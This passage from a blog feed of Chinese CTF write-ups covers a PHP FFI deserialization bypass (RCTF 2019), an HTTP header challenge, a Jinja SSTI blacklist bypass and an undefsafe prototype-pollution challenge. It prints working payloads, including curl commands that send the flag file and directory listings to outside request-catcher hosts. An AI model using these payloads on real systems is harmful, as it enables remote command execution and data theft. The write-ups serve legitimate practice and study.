class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string single-quoted-string">'ret'</span> <span class="token operator">=></span> <span class="token constant">null</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'func'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FFI::cdef'</span><span class="token punctuation">,</span>        <span class="token string single-quoted-string">'arg'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'int system(char *command);'</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">run</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"run&lt;br>"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span> <span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'No implemented'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"__construct&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å³payload</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™é‡Œçš„expä»£ç ä¸­åˆ é™¤äº†åŸæœ‰çš„<code>__serialize</code> ã€<code>__unserialize</code>ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘<code>__unserialize</code>å‡½æ•°ï¼Œè¿™ä¸€ç‰¹æ€§æ˜¯åœ¨PHP7.4ä¸­æ–°åŠ å…¥çš„ï¼Œå…·ä½“å¯å‚è€ƒï¼š<a href="https://wiki.php.net/rfc/custom_object_serialization">https://wiki.php.net/rfc/custom_object_serialization</a> ã€‚</p></blockquote><p>payload:</p><p>æ€è·¯å°±æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨<code>__unserialize</code>ï¼Œç„¶åæ‰§è¡Œ<code>run()</code>å‡½æ•°ï¼Œå°±æ„é€ å‡ºäº†</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ret'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token class-name static-context">FFI</span><span class="token operator">::</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token keyword type-declaration">int</span> <span class="token function">system</span><span class="token punctuation">(</span>char <span class="token operator">*</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°±å’ŒRFCçš„POCå¦‚å‡ºä¸€è¾™äº†ï¼Œä½¿å¾—<code>$data[&#39;ret&#39;]-&gt;system();</code>å¯ä»¥ç»•è¿‡é™åˆ¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;unserialize(base64_decode(ä¸Šé¢ç”Ÿæˆçš„payload))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(ç³»ç»Ÿå‘½ä»¤);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&quot;curl -d @&#x2F;flag https:&#x2F;&#x2F;asd5f4asd.free.beeceptor.com&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909213419249.png"></p><p>ä¹Ÿå› ä¸ºè¿™é¢˜ï¼Œèšå‰‘å‡ºäº†ä¸ªFFIä¸€é”®åˆ©ç”¨æ’ä»¶ï¼Œèšå‰‘nbï¼</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">RCTF2019Webé¢˜è§£ä¹‹nextphp</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> disable_function </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[BSidesCF 2020]Hurdles</title>
      <link href="/p/3350441754.html"/>
      <url>/p/3350441754.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[HTTP|postman|é—¯å…³]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141019371.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141034742.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141051660.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141442114.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909141612431.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142129632.png"></p><p>basicallyæ˜¯æç¤º</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142222787.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142254870.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142403774.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142418718.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142616255.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142652919.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142713636.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142832234.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142914894.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909142928944.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143033132.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143055209.png"></p><p>ç”¨<code>Accept-Languageï¼Œ</code>æŸ¥è¯¢<a href="https://blog.csdn.net/u014549283/article/details/81742104">è¯­è¨€ä»£ç ç¼©å†™è¡¨å¤§å…¨</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143158882.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143214510.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143232312.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2020-Hurdles/image-20210909143255399.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GWCTF 2019]ä½ çš„åå­—</title>
      <link href="/p/4169927949.html"/>
      <url>/p/4169927949.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909103234948.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>åŸæœ¬ä»¥ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œæ²¡æƒ³åˆ°æ˜¯ssti</p><p>è€Œä¸”è™½ç„¶æ˜¯pythonåç«¯ï¼Œä½†åŠ äº†ä¸ªphpæ¨¡å¼çš„æŠ¥é”™å’Œindex.phpè·¯ç”±</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909110224214.png"></p><p><code>&#123;&#123;</code>è¢«è¿‡æ»¤ï¼Œç”¨<code>&#123;% if ... %&#125;&#123;% endif %&#125;</code>ä»£æ›¿ï¼Œç”¨<code>os.popen</code>+<code>curl</code>æ¥å¸¦å‡ºæ•°æ®</p><p>æœ‰é»‘åå•è¿‡æ»¤ï¼Œéé€’å½’æ¨¡å¼ï¼Œå­˜åœ¨é€»è¾‘é”™è¯¯</p><p>æ¯”å¦‚è¾“å…¥<code>imporgetattrt</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/image-20210909124515989.png"></p><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°æœ€åä¸€ä¸ªã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleepurl <span class="token operator">=</span> <span class="token string">"http://c21719f3-6650-4fee-b5de-7113e95abbb1.node4.buuoj.cn:81/"</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'subclasses'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span> <span class="token string">'args'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'if'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">,</span>             <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'execfile'</span><span class="token punctuation">,</span> <span class="token string">'from_pyfile'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span>             <span class="token string">'self'</span><span class="token punctuation">,</span> <span class="token string">'item'</span><span class="token punctuation">,</span> <span class="token string">'getitem'</span><span class="token punctuation">,</span> <span class="token string">'getattribute'</span><span class="token punctuation">,</span> <span class="token string">'func_globals'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">find_unused_word</span><span class="token punctuation">(</span>words<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    used_word <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">set</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"[a-zA-Z]+"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> words <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> used_word<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">replace_fuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl https://sfg56dsf.free.beeceptor.com/?i=`ls / |base64`') %&#125;1&#123;% endif %&#125;"</span>    unused_word <span class="token operator">=</span> find_unused_word<span class="token punctuation">(</span>blacklist<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>unused_word<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> unused_word<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> i        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"hello !"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"cla"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">"ss"</span>            <span class="token punctuation">&#125;</span>            sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"class"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] find </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_fuzz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token punctuation">:</span> i        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>i<span class="token punctuation">)</span>        <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    replace_fuzz<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl https:&#x2F;&#x2F;sfg56dsf.free.beeceptor.com&#x2F;?i&#x3D;&#96;ls &#x2F; |base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl https:&#x2F;&#x2F;sfg56dsf.free.beeceptor.com&#x2F;?i&#x3D;&#96;cat &#x2F;flag_1s_Hera |base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç½‘é¼æ¯ 2020 é’é¾™ç»„]notes</title>
      <link href="/p/285081490.html"/>
      <url>/p/285081490.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[undefsafe|åŸå‹é“¾|<code>__proto__</code>|CVE-2019-10795]</p><p>ç»™äº†æºç </p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">var express &#x3D; require(&#39;express&#39;);var path &#x3D; require(&#39;path&#39;);const undefsafe &#x3D; require(&#39;undefsafe&#39;);const &#123; exec &#125; &#x3D; require(&#39;child_process&#39;);var app &#x3D; express();class Notes &#123;    constructor() &#123;        this.owner &#x3D; &quot;whoknows&quot;;        this.num &#x3D; 0;        this.note_list &#x3D; &#123;&#125;;    &#125;    write_note(author, raw_note) &#123;        this.note_list[(this.num++).toString()] &#x3D; &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;    &#125;    get_note(id) &#123;        var r &#x3D; &#123;&#125;        undefsafe(r, id, undefsafe(this.note_list, id));        return r;    &#125;    edit_note(id, author, raw) &#123;        undefsafe(this.note_list, id + &#39;.author&#39;, author);        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);    &#125;    get_all_notes() &#123;        return this.note_list;    &#125;    remove_note(id) &#123;        delete this.note_list[id];    &#125;&#125;var notes &#x3D; new Notes();notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));app.set(&#39;view engine&#39;, &#39;pug&#39;);app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, &#39;public&#39;)));app.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.render(&#39;index&#39;, &#123; title: &#39;Notebook&#39; &#125;);&#125;);app.route(&#39;&#x2F;add_note&#39;)    .get(function(req, res) &#123;        res.render(&#39;mess&#39;, &#123;message: &#39;please use POST to add a note&#39;&#125;);    &#125;)    .post(function(req, res) &#123;        let author &#x3D; req.body.author;        let raw &#x3D; req.body.raw;        if (author &amp;&amp; raw) &#123;            notes.write_note(author, raw);            res.render(&#39;mess&#39;, &#123;message: &quot;add note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#39;mess&#39;, &#123;message: &quot;did not add note&quot;&#125;);        &#125;    &#125;)app.route(&#39;&#x2F;edit_note&#39;)    .get(function(req, res) &#123;        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id &#x3D; req.body.id;        let author &#x3D; req.body.author;        let enote &#x3D; req.body.raw;        if (id &amp;&amp; author &amp;&amp; enote) &#123;            notes.edit_note(id, author, enote);            res.render(&#39;mess&#39;, &#123;message: &quot;edit note sucess&quot;&#125;);        &#125; else &#123;            res.render(&#39;mess&#39;, &#123;message: &quot;edit note failed&quot;&#125;);        &#125;    &#125;)app.route(&#39;&#x2F;delete_note&#39;)    .get(function(req, res) &#123;        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);    &#125;)    .post(function(req, res) &#123;        let id &#x3D; req.body.id;        if (id) &#123;            notes.remove_note(id);            res.render(&#39;mess&#39;, &#123;message: &quot;delete done&quot;&#125;);        &#125; else &#123;            res.render(&#39;mess&#39;, &#123;message: &quot;delete failed&quot;&#125;);        &#125;    &#125;)app.route(&#39;&#x2F;notes&#39;)    .get(function(req, res) &#123;        let q &#x3D; req.query.q;        let a_note;        if (typeof(q) &#x3D;&#x3D;&#x3D; &quot;undefined&quot;) &#123;            a_note &#x3D; notes.get_all_notes();        &#125; else &#123;            a_note &#x3D; notes.get_note(q);        &#125;        res.render(&#39;note&#39;, &#123;list: a_note&#125;);    &#125;)app.route(&#39;&#x2F;status&#39;)    .get(function(req, res) &#123;        let commands &#x3D; &#123;            &quot;script-1&quot;: &quot;uptime&quot;,            &quot;script-2&quot;: &quot;free -m&quot;        &#125;;        for (let index in commands) &#123;            exec(commands[index], &#123;shell:&#39;&#x2F;bin&#x2F;bash&#39;&#125;, (err, stdout, stderr) &#x3D;&gt; &#123;                if (err) &#123;                    return;                &#125;                console.log(&#96;stdout: $&#123;stdout&#125;&#96;);            &#125;);        &#125;        res.send(&#39;OK&#39;);        res.end();    &#125;)app.use(function(req, res, next) &#123;  res.status(404).send(&#39;Sorry cant find that!&#39;);&#125;);app.use(function(err, req, res, next) &#123;  console.error(err.stack);  res.status(500).send(&#39;Something broke!&#39;);&#125;);const port &#x3D; 8080;app.listen(port, () &#x3D;&gt; console.log(&#96;Example app listening at http:&#x2F;&#x2F;localhost:$&#123;port&#125;&#96;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>undefsafeä½œç”¨</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> object <span class="token operator">=</span> <span class="token punctuation">&#123;</span>a<span class="token operator">:</span> <span class="token punctuation">&#123;</span>b<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">undefsafe</span><span class="token punctuation">(</span>object<span class="token punctuation">,</span> <span class="token string">'a.b.0'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; a: &#123; b: [10, 2, 3] &#125; &#125;</span><span class="token comment">//è¿™é‡Œå¯ä»¥çœ‹è§1è¢«æ›¿æ¢æˆäº†10</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">CVE-2019-10795 åŸå‹é“¾æ±¡æŸ“(Prototype Pollution)</a></p><p>åœ¨ç‰ˆæœ¬å°äº2.0.3çš„<code>undefsafe</code>å‡½æ•°æœ‰æ¼æ´ï¼Œå¯ä»¥æ±¡æŸ“<strong>æ‰€æœ‰å¯¹è±¡</strong>çš„åŸå‹é“¾ï¼Œç»™å¯¹è±¡æ·»åŠ 